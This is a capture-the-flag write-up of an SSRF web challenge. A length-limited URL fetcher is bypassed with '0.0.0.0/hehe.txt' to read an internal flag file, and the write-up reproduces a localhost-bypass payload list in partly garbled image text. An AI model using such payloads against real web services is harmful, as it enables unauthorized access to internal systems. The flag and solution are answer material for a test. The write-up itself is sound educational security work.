# FRSS
> `-`

## About the Challenge
We got a websites that can make requests to other websites and display the response


[Image extracted text: Enter URL:
Submit
hmmm,
I just
code leak like this
Sx
curl_init(Surl) _
curl_setopt(Sx,
CURLOPTREDIR
PROTOCOLS,
CURLPROTO_HTTP) ;
curl_setopt
CURLOPT_PROTOCOLS,
CURLPROTO_HTTP) ;
curl_setopt(Sx,
CURLOPT_MAXREDIRS ,
1) ;
echo
curl_exec( Sx) ;
welcome to DEADSEC-CTF-2023 !!! Onsra just says flag named hehe.txt
got
Sx,]


We need to access `/hehe.txt` by using that feature. However there is a limit of characters that we can input into that form


[Image extracted text: Enter URL:
Submit
hmmm,
I just got
code leak
like this
Sx
curl_init(Surl);
cur1
setopt(Sx,
CURLOPT_REDIR_PROTOCOLS,
CURLPROTO_HTTP) ;
curl_setopt (Sx,
CURLOPT_PROTOCOLS,
CURLPROTO_HTTP) ;
curl_setopt(Sx,
CURLOPT_MAXREDIRS,
1) ;
echo
curl_exec (Sx) ;
Oh no no, url is too
I can't handle it
long]


## How to Solve?
In order to read the flag, we need to access the website internally and access the `/hehe.txt` endpoint

At first, I inputted `127.0.0.1/hehe.txt` but the response is `Oh no no, url is too long I can't handle it`. And then I and found this [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)


[Image extracted text: Payloads with localhost
localhost
http:
/localhost:80
http:/ /localhost:443
http:
/localhost:22
127
0.0.1
http:
1127
0.1
80
http:_
1127
0.1.443
http:/ /127
0.1.22
0.0.0.0
http:_
10
0.0.0:80
http:
10
0.0.0:443
http://0.0.0.0:22
Using
Using
Using]


So, my final payload was:
```
0.0.0.0/hehe.txt
```


[Image extracted text: Enter URL
Submit
hmmm,
I just
code
leak like this
Sx
curl_init(Surl)_
curl_setopt(Sx,
CURLOPT
REDIR
PROTOCOLS,
CURLPROTO_HTTP) ;
curl_setopt
CURLOPT_PROTOCOLS,
CURLPROTO_HTTP) ;
curl_setopt(Sx,
CURLOPT_MAXREDIRS,
1) ;
echo curl_exec ( Sx) ;
dead {Ashiiiibaaa_
you_hAv3_Pybass_chAlI}
got
Sx,]


```
dead{Ashiiiibaaa_you_hAv3_Pybass_chA11}
```